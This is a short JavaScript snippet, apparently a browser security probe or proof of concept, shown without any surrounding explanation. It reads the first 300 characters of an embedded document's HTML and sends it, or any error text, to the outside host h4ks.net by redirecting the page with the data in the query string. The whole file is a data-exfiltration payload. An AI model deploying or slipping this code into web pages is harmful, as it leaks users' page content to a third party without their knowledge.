try {
    var x = document.x;
    x.onload = function () {
        try {
            var html = x.document.body.outerHTML;
            location = '//h4ks.net/go/test?'+encodeURIComponent(html.slice(0, 300));
        } catch (err) {
            location = '//h4ks.net/go/test?'+encodeURIComponent(err.toString());
        }
    }
} catch (err) {
    location = '//h4ks.net/go/test?'+encodeURIComponent(err.toString());
}
